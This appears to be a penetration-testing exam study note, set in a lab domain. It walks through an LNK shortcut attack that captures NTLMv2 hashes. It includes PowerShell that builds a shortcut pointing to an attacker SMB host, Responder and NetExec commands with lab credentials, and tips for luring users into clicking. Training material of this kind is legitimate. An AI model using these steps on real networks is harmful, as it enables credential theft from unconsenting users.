---

# 🪓 **LNK File Attacks Exam Reference**

---

## **Summary**

This guide covers how to perform **LNK file attacks** to capture **NTLMv2 hashes** using the **Responder** tool. By creating a **malicious LNK file** and placing it in a shared drive, we trick the target into clicking the file, causing their credentials (username and NTLMv2 hash) to be sent to our attacker machine running Responder. Additionally, it introduces an alternative method using **NetExec** to upload files directly to shared folders via SMB.

### What is a **LNK** file?

A **LNK file** is a **Windows shortcut** file that points to another file or location (like a document, program, or network resource). It doesn't contain the actual file but links to it.

### Why did Responder pick it up?

Even if you don’t **open** or **run** the LNK file, Windows may automatically try to load the **target location** (the file or resource it's pointing to) in the background. This is especially true if the LNK file points to a **network resource** (like our attacker’s machine).

### In our case:

- When the LNK file is **created to point to a remote resource**, Windows will try to access it.
- This triggers **Responder** to capture the **NTLMv2 hash** as Windows attempts to authenticate with that remote resource.

**Summary:**

Even without opening the LNK file, Windows attempts to access the remote resource, which allows **Responder** to capture credentials.

## **Easy-to-Digest Summary of Steps**

Here’s a quick overview of what we did:

1. **Created a malicious LNK file** on the target machine using PowerShell.
2. **Started Responder** on our attacker machine to capture hashes.
3. **Uploaded the LNK file** to a shared drive on the target network.
4. **Waited for the target to click** the LNK file, which sent their NTLMv2 hash to our attacker machine.
5. **Extracted the captured hash** and used it for further attacks.
6. As an alternative, used **NetExec** to directly upload files to shared drives via SMB.

---

## **Detailed Notes**

### **Step 1: Create a Malicious LNK File**

1. Open **PowerShell** with admin rights on the target machine.
2. Run the following script to create the LNK file:
    
    ```powershell
    $objShell = New-Object -ComObject WScript.shell
    $lnk = $objShell.CreateShortcut("C:\\test.lnk")
    $lnk.TargetPath = "\\\\192.168.164.128\\@test.png"  # Points to attacker machine
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\\system32\\shell32.dll, 3"
    $lnk.Description = "Test"
    $lnk.HotKey = "Ctrl+Alt+T"
    $lnk.Save()
    
    ```
    
3. **Rename the file** to `~Test.lnk` (the `~` ensures it appears at the top of the folder).

---

### **Step 2: Start Responder on the Attacker Machine**

- On **Kali Linux**, launch **Responder** to capture NTLMv2 hashes:
    
    ```bash
    sudo responder -I eth0 -dPv
    
    ```
    

---

### **Step 3: Upload the LNK File to a Shared Drive**

1. Navigate to the shared folder on the target network (e.g., `\\\\HYDRA-DC\\hackme`).
2. **Upload the malicious LNK file** (`~Test.lnk`) to the shared folder.

---

### **Step 4: Wait for the Target to Click the LNK File**

- When the target clicks the LNK file, their **NTLMv2 hash** is sent back to your attacker machine running **Responder**.
- You’ll see something like this on your attacker machine:
    
    ```
    [SMB] NTLMv2-SSP Username : MARVEL\\fcastle
    [SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:<hash>
    
    ```
    

---

### **Step 5: Extract Captured NTLMv2 Hash**

- The NTLMv2 hash can now be cracked or used for further attacks.

---

### **Alternative Method: NetExec for File Uploading**

- If you have access to shared directories, use **NetExec** to upload files directly:
    
    ```bash
    netexec smb 192.168.164.139 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.164.128
    
    ```
    
- **NetExec** will use the built-in **slinky** module to upload your file to a shared drive.

---

## **Abbreviations & Definitions**

- **LNK File**: A Windows shortcut file that links to another file or resource.
- **NTLMv2**: A Windows authentication protocol that can be exploited to capture hashes.
- **Responder**: A tool used for **LLMNR/NetBIOS** poisoning to capture NTLM hashes.
- **NetExec**: A command that allows you to upload files to shared folders using SMB.
- **SMB**: **Server Message Block** - A protocol used for file sharing.

---

## **Critical Mentions & Exam Traps**

- 🚨 **Run Responder before upload**: Always start **Responder** before uploading the LNK file to ensure you’re ready to capture the hash.
- 💡 **Use the `~` symbol**: Adding `~` to the LNK file name ensures it shows at the top of the folder, increasing the chances of the target clicking it.
- 📝 **Verify network conditions**: Ensure the target is on the same network as your attacking machine so that Responder can capture the request.
- 🚨 **Be mindful of target permissions**: Ensure you have the correct permissions to upload files to the shared folder.

---

---